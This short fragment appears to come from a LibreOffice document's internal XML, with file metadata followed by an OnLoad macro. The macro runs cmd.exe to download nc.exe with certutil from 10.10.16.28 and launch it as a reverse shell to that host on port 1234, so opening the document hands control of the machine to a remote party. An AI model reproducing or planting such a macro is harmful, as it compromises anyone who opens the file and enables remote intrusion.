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8:04:15.907916900</meta:creation-date>
    <meta:generator>LibreOffice/6.1.5.2$Linux_X86_64 LibreOffice_project/10$Build-2</meta:generator>
    <dc:date>2019-04-19T08:44:24.575701141</dc:date>
    <meta:editing-duration>PT1M53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OnLoad
	Shell("cmd.exe /c certutil.exe  -f -split -urlcache  http://10.10.16.28/nc.exe C:\Windows\Temp\nc.exe &amp;&amp; C:\Windows\Temp\nc.exe 10.10.16.28 1234 -e cmd.exe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